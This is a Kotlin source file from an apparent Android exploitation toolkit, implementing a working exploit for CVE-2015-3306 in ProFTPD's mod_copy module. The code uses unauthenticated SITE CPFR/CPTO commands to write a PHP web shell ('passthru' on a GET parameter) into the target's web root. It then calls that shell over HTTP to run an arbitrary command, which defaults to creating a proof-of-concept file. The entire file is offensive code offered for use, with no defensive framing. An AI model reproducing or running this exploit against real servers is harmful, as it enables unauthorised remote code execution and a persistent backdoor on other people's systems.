package me.smoothhacker.swampsploit.exploit

import android.util.Log
import java.io.BufferedInputStream
import java.io.IOException
import java.io.InputStream
import java.io.PrintWriter
import java.net.*
import java.util.*
import kotlin.random.asKotlinRandom

class ProFTPD constructor(
    private val address: String,
    private val port: Int = 21,
    private val timeout: Int = 1000,
    private val tempPath: String = "/tmp",
    private val sitePath: String = "/var/www/html",
    private val payload: String = "touch PoCFile",
) {
    val random = Random().asKotlinRandom()
    val tag = "CVE-2015-3306"


    private fun randomAlphanumeric(length: Int): String {
        val alphanumeric = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return String(Array(length) { alphanumeric[random.nextInt(alphanumeric.length)] }.toCharArray())
    }

    fun exploit() {
        val get = randomAlphanumeric(5 + random.nextInt(3))
        val payloadName = randomAlphanumeric(5 + random.nextInt(3)) + ".php"

        val client = Socket()
        client.soTimeout = timeout

        try {
            client.connect(InetSocketAddress(address, port))
        } catch (e: IOException) {
            Log.w(tag, "$address:$port - Failed to establish connection.")
            return
        }

        val input = client.getInputStream()
        val reader = input.bufferedReader()
        val writer = PrintWriter(client.getOutputStream(), true)

        try {
            if (!reader.readLine().contains("220")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed to retrieve 220 status.")
            return
        }

        writer.println("site cpfr /proc/self/cmdline")
        var result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying from '/proc/self/cmdline'.")
            return
        }

        writer.println("site cpto $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying to '$tempPath'.")
            return
        }

        writer.println("site cpfr $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying from '$tempPath'.")
            return
        }

        writer.println("site cpto $sitePath/$payloadName")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying PHP payload to '$sitePath/$payloadName'.")
            return
        }

        val url = URL("http://$address/$payloadName?$get=${URLEncoder.encode("nohup $payload &")}")
        val urlConnection = url.openConnection() as HttpURLConnection
        try {
            val x: InputStream = BufferedInputStream(urlConnection.inputStream)
            x.reader().readLines().forEach { Log.w(tag, it) }
        } finally {
            urlConnection.disconnect()
        }

        client.close()
    }
}
